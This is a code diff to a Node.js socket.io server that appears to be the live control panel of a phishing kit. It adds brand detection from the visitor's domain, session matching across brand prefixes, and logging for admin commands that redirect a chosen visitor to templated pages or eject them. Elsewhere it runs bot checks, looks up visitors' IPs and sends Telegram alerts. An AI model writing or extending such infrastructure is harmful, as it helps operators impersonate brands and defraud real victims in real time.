@@ -1568,12 +1568,35 @@ if (botCheck.isBot) {
 userNamespace.on('connection', async (socket) => {
     const userAgent = socket.handshake.headers['user-agent'];
     const clientIP = socket.cleanIP;
-    
+
     try {
         const ipDetails = await getIPDetails(clientIP);
-        const sessionId = generateSessionId(clientIP, userAgent);
-        
+
+        // Try to get session ID from query params first (if provided by client)
+        let sessionId = socket.handshake.query.sessionId;
+
+        if (!sessionId) {
+            // If not provided, try to detect brand from referrer or host
+            const host = socket.handshake.headers.host || socket.handshake.headers.referer || '';
+            const detectedBrand = detectBrandFromDomain(host);
+            sessionId = generateSessionId(clientIP, userAgent, detectedBrand);
+        }
+
+        console.log(`[USER CONNECTION] Socket connected with session ID: ${sessionId}`);
+
         let session = sessionManager.getSession(sessionId);
+
+        // If not found, try to find by any brand prefix
+        if (!session) {
+            const baseId = sessionId.includes('-') ? sessionId.split('-')[1] : sessionId;
+            const allSessions = sessionManager.getAllVerifiedSessions();
+            session = allSessions.find(s => s.id.endsWith(`-${baseId}`));
+            if (session) {
+                sessionId = session.id;
+                console.log(`[USER CONNECTION] Found session by base ID: ${sessionId}`);
+            }
+        }
+
         if (session) {
             // Clean up any existing timeouts
             if (session.disconnectTimeout) {
@@ -1817,34 +1840,18 @@ userNamespace.on('connection', async (socket) => {
         socket.on('disconnect', () => {
             const sessionId = socket.sessionId;
             const session = sessionManager.getSession(sessionId);
-            
+
             if (session) {
-                // If we're loading, give a grace period before marking as disconnected
-                if (session.loading) {
-                    // Clear any existing timeout
-                    const existingTimeout = loadingTimeouts.get(sessionId);
-                    if (existingTimeout) {
-                        clearTimeout(existingTimeout);
-                    }
-        
-                    // Set new timeout - only mark as disconnected if load doesn't complete in 5s
-                    const timeout = setTimeout(() => {
-                        const currentSession = sessionManager.getSession(sessionId);
-                        if (currentSession && currentSession.loading) {
-                            currentSession.loading = false;
-                            currentSession.connected = false;
-                            adminNamespace.emit('session_updated', currentSession);
-                        }
-                        loadingTimeouts.delete(sessionId);
-                    }, 5000);
-                    
-                    loadingTimeouts.set(sessionId, timeout);
-                } else {
-                    // If not loading, mark as disconnected immediately
-                    session.connected = false;
-                    session.loading = false;
-                    adminNamespace.emit('session_updated', session);
+                // Mark as disconnected immediately
+                session.connected = false;
+                session.loading = false;
+
+                // Update the admin immediately
+                if (!sessionManager.isPending(sessionId)) {
+                    emitSessionUpdate('session_updated', session);
                 }
+
+                console.log(`User disconnected: ${sessionId}`);
         
                 session.lastHeartbeat = Date.now();
                 
@@ -1992,10 +1999,14 @@ adminNamespace.on('connection', (socket) => {
     });
 
     socket.on('redirect_user', ({ sessionId, page, placeholders }) => {
+        console.log(`[REDIRECT] Attempting to redirect session ${sessionId} to ${page}`);
         const sockets = Array.from(userNamespace.sockets.values());
+        console.log(`[REDIRECT] Found ${sockets.length} connected user sockets`);
+
         const targetSocket = sockets.find(s => s.sessionId === sessionId);
 
         if (targetSocket) {
+            console.log(`[REDIRECT] Found target socket for session ${sessionId}`);
             const session = sessionManager.getSession(sessionId);
             if (session) {
                 // Clear any existing timeout
@@ -2034,9 +2045,16 @@ adminNamespace.on('connection', (socket) => {
                 const newUrl = sessionManager.updateSessionUrl(session);
 
                 if (newUrl) {
+                    console.log(`[REDIRECT] Sending redirect to ${newUrl}`);
                     targetSocket.emit('redirect', newUrl);
+                } else {
+                    console.log(`[REDIRECT] Failed to generate redirect URL`);
                 }
+            } else {
+                console.log(`[REDIRECT] Session ${sessionId} not found`);
             }
+        } else {
+            console.log(`[REDIRECT] No socket found for session ${sessionId}`);
         }
     });
     
@@ -2045,18 +2063,29 @@ adminNamespace.on('connection', (socket) => {
 
     
     socket.on('remove_session', async ({ sessionId }) => {
+        console.log(`[REMOVE] Attempting to remove session ${sessionId}`);
         const session = sessionManager.getSession(sessionId);
         if (session) {
-          // Emit redirect to the user socket
-          const sockets = Array.from(userNamespace.sockets.values());
-          const targetSocket = sockets.find(s => s.sessionId === sessionId);
-          if (targetSocket) {
-            targetSocket.emit('redirect', state.settings.redirectUrl);
-            targetSocket.disconnect(true);
-          }
-          
-          // Delete the session
-          sessionManager.deleteSession(sessionId);
+            // First, find and disconnect the user socket
+            const sockets = Array.from(userNamespace.sockets.values());
+            console.log(`[REMOVE] Found ${sockets.length} connected sockets`);
+
+            const targetSocket = sockets.find(s => s.sessionId === sessionId);
+            if (targetSocket) {
+                console.log(`[REMOVE] Found socket for session ${sessionId}, redirecting and disconnecting`);
+                // Send redirect first
+                targetSocket.emit('redirect', state.settings.redirectUrl);
+                // Force disconnect after a small delay to ensure redirect is sent
+                setTimeout(() => {
+                    targetSocket.disconnect(true);
+                }, 100);
+            } else {
+                console.log(`[REMOVE] No active socket found for session ${sessionId}`);
+            }
+
+            // Delete the session from manager
+            sessionManager.deleteSession(sessionId);
+            console.log(`[REMOVE] Session ${sessionId} deleted from manager`);
           adminNamespace.emit('session_removed', sessionId);
           await sendTelegramNotification(formatTelegramMessage('session_removed', {
             id: sessionId,
